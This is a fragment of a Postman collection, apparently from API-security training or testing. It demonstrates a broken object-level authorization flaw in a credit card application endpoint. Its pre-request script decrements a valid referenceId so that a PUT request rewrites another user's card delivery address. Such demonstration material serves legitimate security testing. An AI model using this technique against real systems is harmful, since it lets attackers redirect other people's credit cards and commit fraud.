						{
							"name": "Credit Card Application (malicious)",
							"event": [
								{
									"listen": "prerequest",
									"script": {
										"exec": [
											"let validId = pm.environment.get(\"referenceId\");",
											"",
											"pm.environment.set(\"bola_referenceId\", validId - 1);",
											"",
											"",
											""
										],
										"type": "text/javascript",
										"packages": {}
									}
								}
							],
							"request": {
								"method": "PUT",
								"header": [],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"delivery\": \"post\",\n    \"postalAddress\": {\n        \"addressLine\": [\n            \"IJntzelaan 27\",\n            \"Mildam\",\n            \"Friesland\"\n        ],\n        \"postCode\": \"8454KV\",\n        \"country\": \"NL\"\n    }\n}",
									"options": {
										"raw": {
											"language": "json"
										}
									}
								},
								"url": {
									"raw": "{{baseURL}}/account/products/cards/{{bola_referenceId}}",
									"host": [
										"{{baseURL}}"
									],
									"path": [
										"account",
										"products",
										"cards",
										"{{bola_referenceId}}"
									]
								}
							},
							"response": []
						}
					],
					"description": "Credit card applications are identified by a referenceId, which is a simple incrementing integer index. This makes it easy to guess the referenceId for other users' credit card applications (1003, 1002, 1001, ...)\n\nA malicious user notices that the API to update a credit card application uses referenceId. By changing the referenceId, they can change the postal address for another users new credit card delivery."
				},
